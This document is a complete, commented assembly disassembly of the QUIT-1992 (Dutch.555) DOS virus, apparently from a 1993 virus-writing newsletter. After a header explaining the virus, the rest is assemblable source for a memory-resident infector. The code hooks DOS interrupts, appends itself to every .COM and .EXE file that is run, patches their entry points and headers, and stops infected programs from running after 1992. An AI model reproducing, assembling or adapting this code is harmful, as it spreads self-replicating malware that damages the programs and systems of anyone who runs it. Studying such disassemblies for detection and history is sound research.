   ;*****************************************************************************
   ;
   ;                             QUIT-1992.ASM (DUTCH.555)
   ;                              Disassembly by K”hntark
   ;                               DATE:  24-Nov-93
   ;                            Assemble with: TASM-2.X
   ;
   ;*****************************************************************************
   ; QUIT1992.555 virus disassembly, for Crypt Newsletter 21:
   ; The QUIT virus is a straightforward .COM/.EXE program memory resident
   ; file infector.  It is extremely infectious and features an
   ; inventive "Are you resident in memory" check using Int 21h's DOS
   ; version call.  When QUIT becomes resident for the first time,
   ; it sets up its Int 21 handler so any subsequent DOS version check
   ; is also filtered through the virus's Int 24h critical error handler.
   ; In standard practice, the virus's critical error handler returns
   ; a "0" in al, which serves to signal the operating system to ignore
   ; the virus's request to write to an executable program being loaded from
   ; a write-protected disk, and proceed with the loading of the protected
   ; program.  When a previously QUIT-infected program attempts to launch
   ; the virus into memory while a copy of the virus is already installed,
   ; QUIT performs a DOS version check, and looks at the value returned
   ; in al, which will be "0" if the virus has already installed itself
   ; and hooked its critical error handler to the DOS version check.  In
   ; this case, the virus exits.
   ;
   ; QUIT also performs a date/time check - if it is anytime after 1992,
   ; the virus terminates without allowing its host to execute.  [Hence
   ; the name QUIT - all virus infected programs "QUIT" after 1992.]
   ; Obviously, QUIT is extremely noticeable.  It will however, become
   ; resident from any infected program and subsequently infect everything
   ; which is executed while NOT allowing these programs to run.  Of
   ; course, these programs are - for all practical purposes - ruined
   ; immediately & turned into QUIT zombies - unless the time on the
   ; machine is reset to some value before the end of 1992 and kept there.
   ; The overly anal will note that even if the system time is reset
   ; properly, programs are still ruined by QUIT because no one would actually
   ; want this thing attached to their executables.
   ;*****************************************************************************


   VIRUS_SIZE      equ     OFFSET ENDVIRUS - OFFSET DATA
   INT_21H         equ     5
   INT_21H_SEG     equ     7
   INT_24H_OFF     equ     9
   INT_24H_SEG     equ     0Bh
   FILE_TIME       equ     0Dh
   FILE_DATE       equ     0Fh
   FILE_ATTRIB     equ     11h

   FILE_BUFFER     equ     12h  ;EXE header / COM
   REMAINDER       equ     14h  ;Remainder
   FILE_SIZE       equ     16h  ;Size of file in 512 byte pages
   HEADER_SIZE     equ     1Ah  ;Size of header
   MAX_NUM_PAR     equ     1Eh  ;Maximum # of paragraphs required after loaded program
   STACK_SEG       equ     20h  ;Stack Segment offset   (SS)
   STACK_POINTER   equ     22h  ;Stack Pointer          (SP)
   INST_PTR        equ     26h  ;Instruction Pointer    (IP)
   CODE_SEG        equ     28h  ;Offset of Code Segment (CS) in paragraphs
   EXE_ID          equ     2Dh  ;EXE infection ID

   ;*****************************************************************************

   VIRUS           SEGMENT BYTE PUBLIC
           ASSUME  cs:VIRUS, ds:VIRUS

           ORG     100h            ;COM HOST
   HOST:
           jmp     VIR_START
           db      0F1h            ;Infection ID
           db      994 dup (90h)   ;rest of HOST FILE
           int     20h             ;exit to DOS

   ;=-=-=-=-=-=-=-=[HOST ENDS HERE - VIRUS BEGINS HERE]-=-=-=-=-=-=-=-=-=-=-=-=-

   DATA:

           db       5Ah, 08h, 00h, 22h, 00h, 60h
           db       14h, 73h, 02h, 56h, 05h, 89h
           db       0Ch, 5Dh, 60h, 78h, 1Bh, 00h

   ;FILE_BUFFER
           db       90h, 90h, 90h      ;3 starting bytes from COM file
           db       25 dup (90h)       ;28 bytes total

   VIR_START:
           call    GET_ADDR
   GET_ADDR:
           pop     bp             ;BP = Entry point
           db      83h,0EDh, 31h  ;sub  bp,31h => 49 bytes of data area
           mov     ax,30F1h       ;ah=function 30h
           int     21h            ;get DOS version number/Virus Resident?

           mov     bx,ds          ;BX = DS
           cmp     al,2           ;DOS 2.0 or below?
           jb      CIAO           ;Exit if DOS < 2.0 or virus resident

   ;*************************
   ; Allocate Memory
   ;*************************

           dec     bx             ;BX = DS - 1/get MCB of current program
           mov     ds,bx          ;DS = DS - 1 = MCB of current program
           inc     bx             ;BX = DS
           push    bx             ;save DS

           mov     al,ds:0000
           mov     [bp],al
           mov     BYTE PTR ds:0000,'M'
           mov     cx,23h                  ;23h * 16 = 560 bytes
           sub     ds:0012h,cx             ;decrease size by 560 bytes
           sub     ds:0003,cx              ;decrease size by 560 bytes
           mov     ax,ds:0003              ;
           db      01h,0D8h                ;add     ax,bx

   ;*************************
   ; Move Virus to memory
   ;*************************

           mov     es,ax                   ;AX = ES Destination Segment
           push    cs
           pop     ds                      ;DS = CS
           mov     si,bp                   ;Source      DS:SI (CS:BP)
           xor     di,di                   ;Destination ES:DI (AX:00)
           mov     cx,VIRUS_SIZE           ;cx = 555 bytes
           rep     movsb                   ;Mov ds:[si] to es:[di]

   ;*************************
   ; Hook INT 21h
   ;*************************

           mov     ds,ax               ;DS = ES
           db      89h,0C1h            ;mov     cx,ax, CX = New Segment
           mov     ax,0C7h             ;New INT 21h OFFSET
           mov     bl,84h              ;INT 21h Address in INT table
           call    HOOK_INT            ;Hook interrupt at 0000:00BL
                           ;New address = CX:0C7h
           mov     ds:INT_21H,ax       ;save ORIGINAL INT 21h OFFSET
           mov     ds:INT_21H_SEG,cx   ;save ORIGINAL INT 21h SEGMENT
           sti                         ;Enable interrupts
           pop     bx                  ;restore BX = DS
           mov     ds,bx               ;DS = original DS
           mov     es,bx               ;ES = original DS
   CIAO:
           cmp     WORD PTR [bp+12h],5A4Dh ;IS HOST an EXE FILE?
           jne     EXIT_COM                ;Exit COM if not equal

   ;*************************
   ; FIX for EXE return
   ;*************************

           db      83h,0C3h, 10h       ;add     bx,10h => add 10h to DS
           mov     ax,bx               ;AX = DS + 10h
           mov     sp,[bp+22h]         ;FIX Stack Pointer SP
           add     ax,[bp+20h]
           mov     ss,ax                   ;FIX stack Segment SS
           add     bx,cs:[bp+28h]
           push    bx                      ;push SEGMENT  CS
           push    WORD PTR cs:[bp+26h]    ;push OFFSET   IP
           jmp     short SKIP              ;continue

   ;*************************
   ; EXIT COM
   ;*************************

   EXIT_COM:
           push    cs                ;save CS
           lea     si,[bp+12h]       ;Load effective addr
           mov     di,100h           ;ES:DI => DS:0100
           push    di                ;save address to do Far Return
           movsw                     ;Mov [si] to es:[di] restore
           movsw                     ;Mov [si] to es:[di] 4 bytes to COM File

   ;*************************
   ; Get YEAR
   ;*************************

   SKIP:
           mov     ah,2Ah              ;DOS Services  ah=function 2Ah
           int     21h                 ;get date, cx=year, dh=month
                           ;dl=day, al=day-of-week 0=SUN
           cmp     cx,7C8h             ;Year = 1992?
           jb      RETURN_TO_HOST      ;Return to host if year < 1992
           mov     ah,4Ch              ;ah=function 4Ch => QUIT
           int     21h                 ;terminate with al=return code

   ;*************************
   ; RETURN to EXE / COM
   ;*************************

   RETURN_TO_HOST:
           xor     ax,ax                ;Zero register
           xor     bx,bx                ;Zero register
           mov     cx,0FFh              ;CX = 00FFh
           mov     dx,ds                ;DS = DX
           retf                        ;Return far to DS:0100h / IP:CS

   ;*****************************************************************************
   ; INT 21h HANDLER
   ;*****************************************************************************

           cmp     ax,4B00h                ;Execute a file?
           je      EXECUTE                 ;Jump if equal
           cmp     ax,30F1h                ;"Are you there?" call
           jne     REAL_INT21h             ;Go to Real int 21h

   ;-------------------
   ; INT 24h Handler
   ;-------------------

           mov     al,0                    ;"Are you there?" answer
           iret                            ;Interrupt return

   REAL_INT21h:
           jmp     DWORD PTR cs:INT_21H   ;jmp to Original INT 21h

   OUTTAHEA:
           pop     ds                ;restore filename pointer at DS:DX
           pop     dx
           jmp     SEE_YA
   EXECUTE:
           push    es                ;save registers
           push    ax
           push    bx
           push    cx
           push    dx
           push    ds

   ;***************************************
   ; Hook INT 24h (critical Error Handler)
   ;***************************************

           mov     ax,0D1h                 ;New INT 24h offset
           mov     cx,cs                   ;New INT 24h Segment = CS
           mov     bl,90h                  ;INT 24h
           call    HOOK_INT                ;Hook INT 24h (Error Handler)
                           ;New address = CS:0D1h

           mov     cs:INT_24H_OFF,ax       ;save Original INT 24h offset
           mov     cs:INT_24H_SEG,cx       ;save Original INT 24h handler
           sti                             ;Enable interrupts
           mov     cs:FILE_ATTRIB,bh      ;save INT 24h INT table address??

   ;*************************
   ; Save File Attributes
   ;*************************

           mov     ax,4300h              ;DOS Services  ah=function 43h
           int     21h                   ;get attrb cx, filename @ds:dx
           test    cl,1                  ;
           jz      CLEAR                 ;Jump if zero
           mov     cs:FILE_ATTRIB,cl     ;save attributes
           and     cl,0FEh               ;clear attributes

   ;*************************
   ; Clear File Attributes
   ;*************************

           mov     ax,4301h              ;DOS Services  ah=function 43h
           int     21h                   ;set attrb cx, filename @ds:dx
           jc      OUTTAHEA              ;Jump if carry Set

   CLEAR:

   ;*************************
   ; Open File
   ;*************************

           mov     ax,3D02h              ;DOS Services  ah=function 3Dh
           int     21h                   ;open file, al=mode,name@ds:dx
           mov     bx,ax                 ;File Handle => AX

   ;***************************************************
   ; Read File
   ; NOTE: TIME & DATE should be saved at this stage!
   ;***************************************************

           push    cs                      ;save CS
           pop     ds                      ;restore DS
           mov     ah,3Fh                  ;DOS Services  ah=function 3Fh
           mov     dx,FILE_BUFFER          ;BUFFER OFFSET
           mov     cx,1Ch                  ;Read 28 bytes
           int     21h                     ;read file, bx=file handle
                           ;cx=bytes to ds:dx buffer

   ;*********************************
   ; Save Time and Date. (Too late!)
   ;*********************************

           call    CHECK_FO_INFECTION
           jz      RESTORE_ATTRIBUTES      ;Jump if zero (zero = infected)
           mov     ax,5700h                ;DOS Services  ah=function 57h
           int     21h                     ;get file date+time, bx=handle
                           ;returns cx=time, dx=time

           mov     ds:FILE_TIME,cx         ;save time
           mov     ds:FILE_DATE,dx         ;save date

   ;*******************************
   ; File PRT @ EOF
   ;*******************************

           mov     ax,4202h                ;DOS Services  ah=function 42h
           xor     cx,cx                   ;Zero register
           xor     dx,dx                   ;Zero register
           int     21h                     ;move file ptr, bx=file handle
                           ;al=method, cx,dx=offset

   ;*******************************
   ; Write VIRUS
   ;*******************************

           push    dx                      ;save file size
           push    ax                      ;save file size

           mov     ah,40h                  ;DOS Services  ah=function 40h
           xor     dx,dx                   ;write from DS:0000
           mov     cx,VIRUS_SIZE           ;cx = 555 bytes = QUIT code
           int     21h                     ;write file  bx=file handle
                           ;cx=bytes from ds:dx buffer


           cmp     ax,cx                   ;555 bytes written?
           pop     ax                      ;restore file size
           pop     dx                      ;restore file size
           jnz     RESTORE_ATTRIBUTES    ;Restore attribs if didn't write 555 bytes

   ;*******************************
   ; File PRT @ Beginning of File
   ;*******************************

           call    FIX_HEADER
           mov     ax,4200h                ;DOS Services  ah=function 42h
           xor     cx,cx                   ;Zero register
           xor     dx,dx                   ;Zero register
           int     21h                     ;move file ptr, bx=file handle
                           ;al=method, cx,dx=offset

   ;*******************************
   ; Write new jump / Header
   ;*******************************

           mov     ah,40h                  ;DOS Services  ah=function 40h
           mov     dx,FILE_BUFFER
           mov     cx,1Ch                  ;Write 28 bytes
           int     21h                     ;write file  bx=file handle
                           ;cx=bytes from ds:dx buffer

   ;*******************************
   ; Restore Date & time (DUH!)
   ;*******************************

           mov     ax,5701h                ;DOS Services  ah=function 57h
           mov     cx,ds:FILE_TIME         ;get time => cx
           mov     dx,ds:FILE_DATE         ;get date => dx
           int     21h                     ;set file date+time, bx=handle
                           ;cx=time, dx=time
   ;*************************
   ; Restore File Attributes
   ;*************************

   RESTORE_ATTRIBUTES:

           pop     ds                    ;get filename pointer from stack
           pop     dx                    ;get filename pointer from stack
           mov     cl,cs:FILE_ATTRIB     ;get saved attributes
           and     cx,0FFh               ;restore attributes
           jz      CLOSE_FILE            ;Jump if zero
           mov     ax,4301h              ;set attrb cx, filename @ds:dx
           int     21h

   ;*************************
   ; Close File Handler
   ;*************************

   CLOSE_FILE:
           mov     ah,3Eh                  ;DOS Services  ah=function 3Eh
           int     21h                     ;close file, bx=file handle


   ;*******************************************
   ; Restore INT 24h (critical Error Handler)
   ;*******************************************

   SEE_YA:
           mov     ax,cs:INT_24H_OFF    ;Restore Original INT 24h offset
           mov     cx,cs:INT_24H_SEG    ;Restore Original INT 24h Segment
           mov     bl,90h               ;INT 24h
           call    RESTORE_INT
           sti                          ;Enable interrupts

           pop     cx                   ;restore registers
           pop     bx
           pop     ax
           pop     es
           jmp     DWORD PTR cs:INT_21H    ;jump to Original INT 21h

   ;*****************************************************************************
   ; ROUTINE - Check for possible File infection
   ;*****************************************************************************

   CHECK_FO_INFECTION:

           cmp     WORD PTR ds:FILE_BUFFER,5A4Dh  ;EXE File?
           je      CHECK_EXE                      ;Check EXE
           cmp     BYTE PTR ds:REMAINDER+1,0F1h   ;COM Infected?

   GO_BACK:
           retn
   CHECK_EXE:
           cmp     BYTE PTR ds:EXE_ID,0F1h    ;EXE Infected?
           je      GO_BACK                    ;Jump if equal
           cmp     WORD PTR ds:MAX_NUM_PAR,0  ;High memory allocation?
           retn

   ;*****************************************************************************
   ; ROUTINE - FIX NEW COM START / EXE HEADER
   ;*****************************************************************************

   FIX_HEADER:

           cmp     WORD PTR ds:FILE_BUFFER,5A4Dh      ;EXE file?
           je      DO_EXE                             ;Jump if equal

   ;**************************
   ; FIX new COM file entry
   ;**************************

           mov     BYTE PTR ds:FILE_BUFFER,0E9h     ;insert new JUMP
           mov     BYTE PTR ds:REMAINDER+1,0F1h     ;Insert Infection ID
           add     ax,2Bh                           ;add 43 to filesize (skip data area)
           mov     WORD PTR ds:FILE_BUFFER+1,ax     ;insert new jump address
           retn                                     ;return

   DO_EXE:
           add     ax,42Bh
           db      88h,0D6h                ;mov     dh,dl
           mov     dl,ah
           mov     ah,0
           shr     dx,1                  ; Shift w/zeros fill
           rcl     ah,1                  ; Rotate thru carry
           mov     ds:REMAINDER,ax       ;Insert load module's remainder
           mov     ds:FILE_SIZE,dx       ;New load module size
           shr     ah,1                  ; Shift w/zeros fill
           rcl     dx,1                  ; Rotate thru carry
           xchg    dl,ah
           sub     ax,3FDh
           xchg    dl,ah
           inc     ah
           dec     dx
           mov     cl,4
           shl     dx,cl                      ;multiply DX by 16
           sub     dx,ds:HEADER_SIZE          ;Get Header Size
           mov     ds:STACK_SEG,dx            ;New SS
           mov     ds:CODE_SEG,dx             ;New CS
           mov     ds:INST_PTR,ax             ;New IP
           mov     ah,5                       ;AX = New SP
           mov     ds:STACK_POINTER,ax        ;NEW SP
           mov     BYTE PTR ds:EXE_ID,0F1h    ;insert Infection ID
           retn                               ;return

   ;*****************************************************************************
   ; ROUTINE - HOOK INTERRUPT
   ;
   ; INPUT:
   ; Hook interrupt at INT TABLE ADDRESS: 0000:00 BL
   ; New INT address = CX:AX
   ;
   ; OUTPUT:
   ; OLD INT address = CX:AX
   ;*****************************************************************************


   HOOK_INT:
           push    cx                      ;save CX
           xor     cx,cx                   ;Zero register
           mov     es,cx                   ;ES = 0
           pop     cx                      ;Restore CX

   ;=-=-[External Entry Point]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

   RESTORE_INT:
           mov     bh,0                    ;BH = 0
           cli                             ;Disable interrupts
           xchg    es:[bx],ax              ;ax <=> ES:[00BL]
           xchg    es:[bx+2],cx            ;ax <=> ES:[00BL + 2]
           retn                            ;return

   ;*****************************************************************************
   ENDVIRUS:                                       ;last byte of virus


   VIRUS           ENDS
           END     HOST
